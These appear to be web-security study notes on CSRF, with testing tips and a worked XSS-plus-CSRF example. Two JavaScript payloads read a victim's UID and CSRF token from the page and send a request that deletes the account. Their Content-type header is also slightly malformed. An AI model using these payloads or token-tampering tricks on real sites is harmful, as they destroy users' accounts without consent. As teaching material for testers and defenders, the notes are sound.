# CSRF

Exploits trust between browser and a vulnerable website.
Logged in sessions of banks etc. save cookies and when the user visits a malicious website and it has a hidden form submitting requests to the vulnerable website and the browser sends the cookies considering it's a regular request.

Generally, application frameworks like Ruby on Rails are increasingly protecting web
forms if the site is performing POST requests, however, this isn’t the case for GET
requests, so be sure to keep an eye out for any GET HTTP calls which change serverside
user data (like DELETE actions). Lastly, if you see a site is sending a CSRF token with
a POST request, try changing the CSRF token value or removing it entirely to ensure the
server is validating its existence.

Use a proxy and check all the
resources that are being called when you visit a target site or application. You
may find an information leak with sensitive data, such as a CSRF token.

## CSRF trigger tags

<img> the source value URL will be requested.
<iframe> also has the source just like the IMG tag. a hidden iframe will be ideal.
<script> src does the same.

Example -

XSS + CSRF
Scenario - We have reflected XSS on a page and we can edit HTML.
Now there is also a UID and CSRF token which we need to be able to carry out CSRF.

We first leverage XSS as
www.example.com/test?url=

`'
<script>
var uid = document.forms[0].elements[0].value; //Traversing HTML for values
var token = document.forms[0].elements[1].value;
var req = new XMLHttpRequest();
req.open("POST", "/webapp/csrf/xss/delete", true);
req.setRequestHeader("Content-type", "x-www-form-urlencoded");
req.send("uid="+uid+ "&csrf_token="+token);
</script>
'`
URL Encode this and we will be able to delete account when a logged in user clicks this link.

If we want to do anything after the change is done we can do the following -
`'
<script>

var uid = document.forms[0].elements[0].value; //Traversing HTML for values
var token = document.forms[0].elements[1].value;

var req = new XMLHttpRequest();
req.onreadystatechange = function(){
  if(req.readyState == 4 && req.status ==200)
{
    alert(req.responseText);
}
};
req.open("POST", "/webapp/csrf/xss/delete", true);
req.setRequestHeader("Content-type", "x-www-form-urlencoded");
req.send("uid="+uid+ "&csrf_token="+token);

</script>
'`
